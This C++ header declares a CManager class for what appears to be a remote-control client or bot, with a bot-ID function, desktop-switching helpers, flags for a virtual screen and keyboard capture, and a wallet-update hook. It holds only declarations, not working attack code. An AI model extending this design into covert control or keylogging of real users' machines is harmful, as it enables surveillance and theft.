// Manager.h: interface for the CManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_MANAGER_H__32F1A4B3_8EA6_40C5_B1DF_E469F03FEC30__INCLUDED_)
#define AFX_MANAGER_H__32F1A4B3_8EA6_40C5_B1DF_E469F03FEC30__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "..\common\commands.h"
#include "IOCPClient.h"

#define ENABLE_VSCREEN 1
#define ENABLE_KEYBOARD 1

HDESK OpenActiveDesktop(ACCESS_MASK dwDesiredAccess = 0);

HDESK IsDesktopChanged(HDESK currentDesk, DWORD accessRights);

bool SwitchToDesktopIfChanged(HDESK& currentDesk, DWORD accessRights);

HDESK SelectDesktop(TCHAR* name);

std::string GetBotId();

typedef IOCPClient CClientSocket;

typedef IOCPClient ISocketBase;

HANDLE MyCreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, // SD
                      SIZE_T dwStackSize,                       // initial stack size
                      LPTHREAD_START_ROUTINE lpStartAddress,    // thread function
                      LPVOID lpParameter,                       // thread argument
                      DWORD dwCreationFlags,                    // creation option
                      LPDWORD lpThreadId, bool bInteractive = false);

class CManager : public IOCPManager
{
public:
    const State&g_bExit; // 1-被控端退出 2-主控端退出
    BOOL m_bReady;
    CManager(IOCPClient* ClientObject);
    virtual ~CManager();

    virtual VOID OnReceive(PBYTE szBuffer, ULONG ulLength) {}
    IOCPClient* m_ClientObject;
    HANDLE	    m_hEventDlgOpen;
    VOID WaitForDialogOpen();
    VOID NotifyDialogIsOpen();

    BOOL IsConnected() const
    {
        return m_ClientObject->IsConnected();
    }
    BOOL Reconnect()
    {
        return m_ClientObject ? m_ClientObject->Reconnect(this) : FALSE;
    }
    virtual void Notify() { }
    virtual void UpdateWallet(const std::string &wallet) { }
    BOOL Send(LPBYTE lpData, UINT nSize);
    BOOL SendData(LPBYTE lpData, UINT nSize)
    {
        return Send(lpData, nSize);
    }
    virtual void SetReady(BOOL ready = true)
    {
        m_bReady = ready;
    }
};

#endif // !defined(AFX_MANAGER_H__32F1A4B3_8EA6_40C5_B1DF_E469F03FEC30__INCLUDED_)
